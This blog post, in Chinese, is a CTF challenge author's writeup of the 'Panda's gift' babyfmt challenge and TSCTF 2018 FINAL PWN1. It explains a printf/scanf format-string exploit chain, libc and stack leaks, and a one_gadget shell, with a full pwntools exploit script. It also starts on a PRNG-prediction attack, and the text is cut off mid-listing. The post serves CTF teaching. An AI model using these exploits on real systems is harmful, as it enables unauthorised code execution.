<!DOCTYPE html>
<html lang="zh-Hans">
<head>

    <!--[if lt IE 9]>
        <style>body {display: none; background: none !important} </style>
        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
    <![endif]-->

<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<meta name="format-detection" content="telephone=no" />
<meta name="author" content="P4nda" />



<meta name="description" content="最近在胖哈勃的月赛和TSCTF2018 FINAL两场比赛担任了出题人的任务，在出题的过程中也学到了很多东西，分享一下题目的题解和相关的知识。">
<meta name="keywords" content="CTF,PWN">
<meta property="og:type" content="article">
<meta property="og:title" content="胖哈勃Panda&#39;s gift 及 TSCTF 2018 FINAL出题笔记">
<meta property="og:url" content="http://p4nda.top/2018/06/25/pwnhub_Panda's_gift/index.html">
<meta property="og:site_name" content="p4nda&#39;s blog">
<meta property="og:description" content="最近在胖哈勃的月赛和TSCTF2018 FINAL两场比赛担任了出题人的任务，在出题的过程中也学到了很多东西，分享一下题目的题解和相关的知识。">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="http://p4nda.top/img/Panda%27s%20gift/1-1.png">
<meta property="og:updated_time" content="2018-07-05T13:40:09.355Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="胖哈勃Panda&#39;s gift 及 TSCTF 2018 FINAL出题笔记">
<meta name="twitter:description" content="最近在胖哈勃的月赛和TSCTF2018 FINAL两场比赛担任了出题人的任务，在出题的过程中也学到了很多东西，分享一下题目的题解和相关的知识。">
<meta name="twitter:image" content="http://p4nda.top/img/Panda%27s%20gift/1-1.png">

<link rel="apple-touch-icon" href= "/apple-touch-icon.png">


    <link rel="alternate" href="/atom.xml" title="p4nda&#39;s blog" type="application/atom+xml">



    <link rel="shortcut icon" href="/img/p4nda.jpeg">



    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">



    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">



    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">


<link rel="stylesheet" href="/css/style.css">



<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">


<title>胖哈勃Panda&#39;s gift 及 TSCTF 2018 FINAL出题笔记 | p4nda&#39;s blog</title>

<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>

<script>
    var yiliaConfig = {
        fancybox: true,
        animate: true,
        isHome: false,
        isPost: true,
        isArchive: false,
        isTag: false,
        isCategory: false,
        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
        search: true
    }
</script>


    <script>
        yiliaConfig.jquery_ui = [true, "//cdn.bootcss.com/jqueryui/1.10.4/jquery-ui.min.js", "//cdn.bootcss.com/jqueryui/1.10.4/css/jquery-ui.min.css"];
    </script>



    <script> yiliaConfig.rootUrl = "\/";</script>





    <script>
        var _hmt = _hmt || [];
        (function() {
            var hm = document.createElement("script");
            hm.src = "//hm.baidu.com/hm.js?11859a78d84a58f3a5bac3d2ec5ea89e";
            var s = document.getElementsByTagName("script")[0]; 
            s.parentNode.insertBefore(hm, s);
        })();
    </script>


</head>
<body>
  <div id="container">
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
    <header id="header" class="inner">
        <a href="/" class="profilepic">
            <img src="/img/p4nda.jpeg" class="animated zoomIn">
        </a>
        <hgroup>
          <h1 class="header-author"><a href="/">P4nda</a></h1>
        </hgroup>

        

        
            <form id="search-form">
            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="false" />
            <i class="fa fa-times" onclick="resetSearch()"></i>
            </form>
            <div id="local-search-result"></div>
            <p class='no-result'>No results found <i class='fa fa-spinner fa-pulse'></i></p>
        


        
            <div id="switch-btn" class="switch-btn">
                <div class="icon">
                    <div class="icon-ctn">
                        <div class="icon-wrap icon-house" data-idx="0">
                            <div class="birdhouse"></div>
                            <div class="birdhouse_holes"></div>
                        </div>
                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
                            <div class="ribbon"></div>
                        </div>
                        
                        <div class="icon-wrap icon-link hide" data-idx="2">
                            <div class="loopback_l"></div>
                            <div class="loopback_r"></div>
                        </div>
                        
                        
                        <div class="icon-wrap icon-me hide" data-idx="3">
                            <div class="user"></div>
                            <div class="shoulder"></div>
                        </div>
                        
                    </div>
                    
                </div>
                <div class="tips-box hide">
                    <div class="tips-arrow"></div>
                    <ul class="tips-inner">
                        <li>菜单</li>
                        <li>标签</li>
                        
                        <li>友情链接</li>
                        
                        
                        <li>关于我</li>
                        
                    </ul>
                </div>
            </div>
        

        <div id="switch-area" class="switch-area">
            <div class="switch-wrap">
                <section class="switch-part switch-part1">
                    <nav class="header-menu">
                        <ul>
                        
                            <li><a href="/">主页</a></li>
                        
                            <li><a href="/archives/">所有文章</a></li>
                        
                            <li><a href="/tags/">标签云</a></li>
                        
                            <li><a href="/about/">关于我</a></li>
                        
                        </ul>
                    </nav>
                    <nav class="header-nav">
                        <ul class="social">
                            
                                <a class="fa Email" href="mailto:root@p4nda.xyz" title="Email"></a>
                            
                                <a class="fa 新浪微博" href="https://www.weibo.com/3655650510/profile?rightmod=1&wvr=6&mod=personinfo" title="新浪微博"></a>
                            
                                <a class="fa GitHub" href="https://github.com/ret2p4nda" title="GitHub"></a>
                            
                                <a class="fa RSS" href="/atom.xml" title="RSS"></a>
                            
                                <a class="fa 知乎" href="https://www.zhihu.com/people/panda_Z/activities" title="知乎"></a>
                            
                                <a class="fa 博客园" href="http://www.cnblogs.com/p4nda/" title="博客园"></a>
                            
                                <a class="fa QQ" href="/381124487" title="QQ"></a>
                            
                        </ul>
                    </nav>
                </section>
                
                
                <section class="switch-part switch-part2">
                    <div class="widget tagcloud" id="js-tagcloud">
                        <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/KERNEL/">KERNEL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux/">Linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PWN/">PWN</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PWNABLE-TW/">PWNABLE.TW</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Questions/">Questions</a></li></ul>
                    </div>
                </section>
                
                
                
                <section class="switch-part switch-part3">
                    <div id="js-friends">
                    
                      <a class="main-nav-link switch-friends-link" href="//p4nda.top/WooyunDrops/">Wooyun知识库</a>
                    
                    </div>
                </section>
                

                
                
                <section class="switch-part switch-part4">
                
                    <div id="js-aboutme">PWNer of Dubhe | PWN &amp; security | byr</div>
                </section>
                
            </div>
        </div>
    </header>                
</div>
    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
      <div class="overlay">
          <div class="slider-trigger"></div>
          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">P4nda</a></h1>
      </div>
    <div class="intrude-less">
        <header id="header" class="inner">
            <a href="/" class="profilepic">
                <img src="/img/p4nda.jpeg" class="animated zoomIn">
            </a>
            <hgroup>
              <h1 class="header-author"><a href="/" title="回到主页">P4nda</a></h1>
            </hgroup>
            
            <nav class="header-menu">
                <ul>
                
                    <li><a href="/">主页</a></li>
                
                    <li><a href="/archives/">所有文章</a></li>
                
                    <li><a href="/tags/">标签云</a></li>
                
                    <li><a href="/about/">关于我</a></li>
                
                <div class="clearfix"></div>
                </ul>
            </nav>
            <nav class="header-nav">
                        <ul class="social">
                            
                                <a class="fa Email" target="_blank" href="mailto:root@p4nda.xyz" title="Email"></a>
                            
                                <a class="fa 新浪微博" target="_blank" href="https://www.weibo.com/3655650510/profile?rightmod=1&wvr=6&mod=personinfo" title="新浪微博"></a>
                            
                                <a class="fa GitHub" target="_blank" href="https://github.com/ret2p4nda" title="GitHub"></a>
                            
                                <a class="fa RSS" target="_blank" href="/atom.xml" title="RSS"></a>
                            
                                <a class="fa 知乎" target="_blank" href="https://www.zhihu.com/people/panda_Z/activities" title="知乎"></a>
                            
                                <a class="fa 博客园" target="_blank" href="http://www.cnblogs.com/p4nda/" title="博客园"></a>
                            
                                <a class="fa QQ" target="_blank" href="/381124487" title="QQ"></a>
                            
                        </ul>
            </nav>
        </header>                
    </div>
    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
</nav>
      <div class="body-wrap"><article id="post-pwnhub_Panda&#39;s_gift" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2018/06/25/pwnhub_Panda's_gift/" class="article-date">
      <time datetime="2018-06-25T12:30:22.000Z" itemprop="datePublished">2018-06-25</time>
</a>


    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      胖哈勃Panda&#39;s gift 及 TSCTF 2018 FINAL出题笔记
    </h1>
  

      </header>
      
      <div class="article-info article-info-post">
        

        
    <div class="article-tag tagcloud">
        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PWN/">PWN</a></li></ul>
    </div>

        <div class="clearfix"></div>
      </div>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h1 id="胖哈勃Panda’s-gift出题"><a href="#胖哈勃Panda’s-gift出题" class="headerlink" title="胖哈勃Panda’s gift出题"></a>胖哈勃Panda’s gift出题</h1><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>题目在main函数中首先提高了栈地址，去掉了部分栈地址随机化（后2字节），便于后续利用。</p>
<p>在init函数中，利用时间作为随机数种子，使用mmap伪随机生成2个内存块，地址可预测。作为题目中visitor_name、motto两个变量的可使用内存。</p>
<p>在login函数中，提供了三个功能。1. 向visitor_name赋值，长度最大为6字节。 2. 向motto赋值，长度最大为0x100字节。 3.打印motto的值。 </p>
<p>上述三个功能由一个全局变量flag控制每个功能仅能调用一次。</p>
<h2 id="漏洞设置"><a href="#漏洞设置" class="headerlink" title="漏洞设置"></a>漏洞设置</h2><p>1、 利用libc及固定时间，visitor_name、motto地址可预测。</p>
<p>2、 在login的set_name函数中，设置了一个6字节的格式化字符串漏洞，且漏洞仅能利用一次。</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>首先，题目在编译时开启了RELRO、NX、CANARY保护，使得got表不可写、不能通过简单溢出利用漏洞。</p>
<h3 id="地址预测"><a href="#地址预测" class="headerlink" title="地址预测"></a>地址预测</h3><p>在链接远程服务器时同时启动脚本，利用python的cdll库与服务器同样的libc可以达到预测的两个地址的效果，如：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> debug:	</span><br><span class="line">  	p = remote(<span class="string">'127.0.0.1'</span>,  <span class="number">9999</span>)<span class="comment">#process('./pwn1')</span></span><br><span class="line">	libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">	libc_run = CDLL(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">	libc_run.srand(libc_run.time(<span class="number">0</span>))</span><br><span class="line">	libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">v2 = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> (v2 &lt;= <span class="number">0x10000</span> ):</span><br><span class="line">    v2 = libc_run.rand() &amp; <span class="number">0xFFFFF000</span>;</span><br><span class="line">visitor_name =  v2</span><br><span class="line">v2 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> ((v2 &lt;= <span class="number">0x10000</span> )|(visitor_name == v2)):</span><br><span class="line">    v2 = libc_run.rand() &amp; <span class="number">0xFFFFF000</span>;</span><br><span class="line">motto =  v2</span><br></pre></td></tr></table></figure>
<h3 id="printf格式化字符串利用"><a href="#printf格式化字符串利用" class="headerlink" title="printf格式化字符串利用"></a>printf格式化字符串利用</h3><p>因为题目本身仅存在一个显式漏洞，只能从该漏洞入手。</p>
<p>由于仅给了6字节的格式化字符串利用，因此考虑用%hn对rbp链写\x0000。</p>
<p>在0x400d31下断点后，可以看到栈结构如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">00:0000│ rbp rsp  0x7ffc5dc00110 —▸ 0x7ffc5dc00120 —▸ 0x7ffc5dc00150 —▸ 0x7ffc5dc00180 ◂— ...</span><br><span class="line">01:0008│          0x7ffc5dc00118 —▸ 0x400d47 ◂— nop    </span><br><span class="line">02:0010│          0x7ffc5dc00120 —▸ 0x7ffc5dc00150 —▸ 0x7ffc5dc00180 —▸ 0x7ffc5df09410 ◂— ...</span><br><span class="line">03:0018│          0x7ffc5dc00128 —▸ 0x400eba ◂— jmp    0x400f4b</span><br><span class="line">04:0020│          0x7ffc5dc00130 ◂— 0x0</span><br><span class="line">05:0028│          0x7ffc5dc00138 ◂— 0x100400bf8</span><br><span class="line">06:0030│          0x7ffc5dc00140 —▸ 0x4010bc ◂— and    eax, 0x6e610064 /* &apos;%d&apos; */</span><br><span class="line">07:0038│          0x7ffc5dc00148 ◂— 0xcc345db59e141600</span><br></pre></td></tr></table></figure>
<p>当向rsp所指的位置利用 <strong>%6$hn</strong> 可以使得在函数返回到login函数时，login的rbp寄存器的后2字节被清零，造成栈迁移。而login函数在调用scanf函数时，使用rbp对格式化字符串寻址：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400E0C                 mov     rax, [rbp+var_10]</span><br><span class="line">.text:0000000000400E10                 mov     rsi, rdx</span><br><span class="line">.text:0000000000400E13                 mov     rdi, rax</span><br><span class="line">.text:0000000000400E16                 mov     eax, 0</span><br><span class="line">.text:0000000000400E1B                 call    __isoc99_scanf</span><br></pre></td></tr></table></figure>
<p>因此，可以控制scanf格式化字符串的地址。</p>
<h3 id="scanf格式化字符串控制"><a href="#scanf格式化字符串控制" class="headerlink" title="scanf格式化字符串控制"></a>scanf格式化字符串控制</h3><p>上一条讲了printf格式化字符串利用方法，而在调用printf格式化字符串前，可以利用set_motto函数预先在栈上布置好相关的地址。</p>
<p><strong><em>tip: 在出题时，我选择用抬高栈的方法使得使用printf格式化字符串利用后修改的rbp一定能落在set_motto使用过的栈中，set_motto从0xxxxxfffd0开始写入到0xxxxx00110结束，但由于栈是复用的，通过对题目调整，使得0xxxxxfffd0 - 0xxxxxffff8是不被栈的复用覆盖的。因此能保证做题时可以劫持栈地址，进一步劫持scanf格式化字符串</em></strong></p>
<p>在set_motto函数中填入 ‘scanf格式字符串’.ljust(0x20,’0’) + motto的地址，可以将scanf的格式化字符串劫持为用户输入的格式化字符串。且仅有0x20长度</p>
<p>由于栈上没有可以控制数据，所以并不能对内存地址任意写。</p>
<p>scanf的处理特性是按照每一个参数顺序处理的，因此利用栈上的rbp链（第10个参数、第16个参数分别是两个函数栈的ebp位置）特性，构造’%dq%10\$pq%16\$pq\0’，可以达到任意写且能保证正常逻辑不崩溃的目的。</p>
<h3 id="地址泄露"><a href="#地址泄露" class="headerlink" title="地址泄露"></a>地址泄露</h3><p>当前已经可以构造内存任意写了，任意写劫持motto指针为got地址，可以泄露libc地址。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p.sendline(<span class="string">'3q'</span>+hex(<span class="number">0x602058</span>)+<span class="string">'q'</span>+hex(elf.got[<span class="string">'puts'</span>])+<span class="string">'q'</span>)</span><br></pre></td></tr></table></figure>
<p>由于flag变量限制，每个函数仅能调用1次，不能继续泄露了，所以对flag置零</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p.sendline(<span class="string">'1q'</span>+hex(<span class="number">0x602050</span>)+<span class="string">'q'</span>+hex(<span class="number">0</span>)+<span class="string">'q'</span>)</span><br></pre></td></tr></table></figure>
<p>使用libc中的environ环境变量，可以泄露栈地址</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p.sendline(<span class="string">'3q'</span>+hex(<span class="number">0x602058</span>)+<span class="string">'q'</span>+hex(libc.symbols[<span class="string">'environ'</span>])+<span class="string">'q'</span>)</span><br></pre></td></tr></table></figure>
<h3 id="劫持控制流"><a href="#劫持控制流" class="headerlink" title="劫持控制流"></a>劫持控制流</h3><p>由于存在canary，直接栈溢出不能用的，此时劫持控制流可以通过修改调用</p>
<p><strong>text:0000000000400E1B                 call    __isoc99_scanf</strong></p>
<p>处的返回地址，相当于函数自修改返回地址，将其修改为one_gadget，就可以拿到shell了。</p>
<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">debug=<span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./babyfmt'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">	p= process(<span class="string">'./babyfmt'</span>)</span><br><span class="line">	context.log_level = <span class="string">'debug'</span></span><br><span class="line">	libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">	libc_run = CDLL(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">	libc_run.srand(libc_run.time(<span class="number">0</span>))</span><br><span class="line">	libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">	gdb.attach(p,<span class="string">'b *0x400d31\nb *0x400e1b\n'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote(<span class="string">'127.0.0.1'</span>,  <span class="number">9999</span>)<span class="comment">#process('./pwn1')</span></span><br><span class="line">	libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">	libc_run = CDLL(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">	libc_run.srand(libc_run.time(<span class="number">0</span>))</span><br><span class="line">	libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">	<span class="comment">#gdb.attach(p,'b *0x400e1b\n')</span></span><br><span class="line">v2 = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> (v2 &lt;= <span class="number">0x10000</span> ):</span><br><span class="line">    v2 = libc_run.rand() &amp; <span class="number">0xFFFFF000</span>;</span><br><span class="line">visitor_name =  v2<span class="comment">#mmap((void *)(signed int)v2, 0x1000uLL, 3, 34, -1, 0LL);</span></span><br><span class="line">v2 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> ((v2 &lt;= <span class="number">0x10000</span> )|(visitor_name == v2)):</span><br><span class="line">    v2 = libc_run.rand() &amp; <span class="number">0xFFFFF000</span>;</span><br><span class="line">motto =  v2<span class="comment">#mmap((void *)(signed int)v2, 0x1000uLL, 3, 34, -1, 0LL);   </span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] motto '</span>,hex(motto) </span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'motto:'</span>)</span><br><span class="line">p.sendline(<span class="string">'%dq%10$pq%16$pq\0'</span>.ljust(<span class="number">0x20</span>)+p64(motto))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'name'</span>)</span><br><span class="line">p.sendline(<span class="string">'%6$hn'</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'3q'</span>+hex(<span class="number">0x602058</span>)+<span class="string">'q'</span>+hex(elf.got[<span class="string">'puts'</span>])+<span class="string">'q'</span>)</span><br><span class="line">libc.address = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\0'</span>) )- libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[+] system"</span>,hex(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'1q'</span>+hex(<span class="number">0x602050</span>)+<span class="string">'q'</span>+hex(<span class="number">0</span>)+<span class="string">'q'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'3q'</span>+hex(<span class="number">0x602058</span>)+<span class="string">'q'</span>+hex(libc.symbols[<span class="string">'environ'</span>])+<span class="string">'q'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p.sendline('1q'+hex(libc.symbols['__malloc_hook'])+'q'+hex(libc.address +0x4526a ))</span></span><br><span class="line"><span class="comment">#add("fmt",0x50,"%dp4nda%10$pp4nda%16$pp4nda\0","...".ljust(0x20,'c'))</span></span><br><span class="line"></span><br><span class="line">stack =  u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\0'</span>) ) &amp;<span class="number">0xfffffffffff00000</span> <span class="number">-0x300000</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"[+] stack"</span>,hex(stack)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'1q'</span>+hex(<span class="number">0x602050</span>)+<span class="string">'q'</span>+hex(<span class="number">0</span>)+<span class="string">'q'</span>)</span><br><span class="line"><span class="comment">#p.recvuntil('&gt;')</span></span><br><span class="line"><span class="comment">#p.sendline('1q'+hex(motto+12)+'q'+hex(0x007073303824))</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'1q'</span>+hex(stack+<span class="number">0x128</span>)+<span class="string">'q'</span>+hex(libc.address+<span class="number">0x4526a</span>)+<span class="string">'q'</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">0x45216	execve("/bin/sh", rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rax == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4526a	execve("/bin/sh", rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x30] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf02a4	execve("/bin/sh", rsp+0x50, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x50] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf1147	execve("/bin/sh", rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure>
<p>##other</p>
<p><a href="https://pwnhub.cn/questiondetail?id=42" target="_blank" rel="noopener">比赛网址</a></p>
<p><a href="https://pan.baidu.com/s/12blLzw1oafmQ3mCFYaa9NA" target="_blank" rel="noopener">题目链接</a> ， 密码： <strong><em>7nb6</em></strong></p>
<p>在*ctf 2018里出现过一道scanf格式字符串的利用，那题比较没有canary，使用%256s就溢出执行rop了。见到考察自构格式化字符串的比较少，所以搞了一题，利用思路和bss段上的printf格式化字符串是类似的，结合printf和scanf搞了一个格式化字符串漏洞大礼包。在编译题目时对栈重新构造了一下，避免了做题去碰随机化的尴尬，在scanf格式化字符串长度那里可以再减小一点，我用了15个字节，在题目中预留了32字节的长度。</p>
<p>由于自己太菜了，忘了libc函数是没有canary保护的，在劫持scanf格式化字符串那里本身就可以劫持scanf的返回地址写ROP了，失去了后面跳板构造内存任意写的作用了，如果那里有canary的话只能按照预期的方法来做了。</p>
<p>拿到一血、二血的<strong><em>test_for_pwn</em></strong>、<strong><em>Swings</em></strong> 大佬都是用这个非预期出的，觉得还是有点失落，但大佬们还是真的很强。</p>
<p>不过，这次比赛名称用了Panda’s gift真的是比较暖心了，虽然题目被非预期了，但是还是学到了很多东西。</p>
<p><img src="/img/Panda&#39;s gift/1-1.png" alt=""></p>
<h1 id="TSCTF-2018-FINAL-PWN1-Writeup"><a href="#TSCTF-2018-FINAL-PWN1-Writeup" class="headerlink" title="TSCTF 2018 FINAL PWN1 Writeup"></a>TSCTF 2018 FINAL PWN1 Writeup</h1><p>此题中留了3处可以获得flag的点</p>
<h2 id="伪随机数预测"><a href="#伪随机数预测" class="headerlink" title="伪随机数预测"></a>伪随机数预测</h2><p>题目中留了一个black-jack游戏，<a href="http://cboard.cprogramming.com/c-programming/114023-simple-blackjack-program.html" target="_blank" rel="noopener">代码</a>参考了pwnable.kr中题目的代码，但里面的漏洞和逻辑bug被我修复了，每一轮游戏可以下注，当达到一定分数时，可以拿到加密后的flag，此题问题在于初始化中调用了srand(time(0)/60)作为伪随机种子，只要在与服务器上程序启动的一分钟以内去生成随机数都是可以正确预测随机数的。相当于可以预测扑克牌生成的序列，当预测到这一轮电脑会赢的时候就下注$1，预测自己会赢的话就全部下注，过不了几轮就可以拿到加密后的flag，解密就可以了。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span 